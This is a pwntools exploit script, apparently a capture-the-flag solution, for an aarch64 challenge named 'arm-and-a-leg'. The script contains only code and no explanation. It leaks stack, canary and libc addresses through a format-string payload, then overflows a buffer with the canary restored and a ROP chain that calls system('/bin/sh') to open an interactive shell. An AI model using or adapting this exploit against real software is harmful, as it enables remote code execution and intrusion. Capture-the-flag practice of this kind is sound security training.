#!/usr/bin/env python3

from pwn import *

context.arch = "aarch64"
context.log_level = "debug"

io = remote("arm-and-a-leg.gold.b01le.rs", 1337)
# io = process("./chal")
elf = ELF("./chal")
libc = ELF("./libc.so.6")

io.recvuntil(b"2. Legs\n")
io.sendline(str(2).encode())
io.recvuntil(b"What number am I thinking of?\n")
io.sendline(str(1337).encode())

io.recvuntil(
    b"Wow, you may now purchase an appendage!\tCould we have an address to ship said appendage? "
)
input("debug")
io.sendline(b"%8$p.%15$p.%21$p.")

io.recvuntil(b"Thanks, we will ship to: ")
stack_base = int(io.recvuntil(b".", drop=True), 16)
canary = int(io.recvuntil(b".", drop=True), 16)
libc_base = int(io.recvuntil(b".", drop=True), 16) - 0x274CC

log.info("stack_base: " + hex(stack_base))
log.info("canary: " + hex(canary))
log.info("libc_base: " + hex(libc_base))

csu_gadget1 = 0x000000000003133C + libc_base
# 0x00000000000e3e90: mov x0, x23; blr x22;
gadget2 = 0x00000000000E3E90 + libc_base

io.recvuntil(b"Care to leave some feedback?!\n")
payload = b"a" * 0x68
payload += flat(
    [
        canary,
        stack_base + 0x130,
        csu_gadget1,
        0,
        canary,
        0,
        gadget2,
        0x19,
        0x20,
        0x21,
        libc_base + libc.symbols["system"],
        libc_base + next(libc.search(b"/bin/sh\x00")),
    ]
)
io.sendline(payload)

io.interactive()
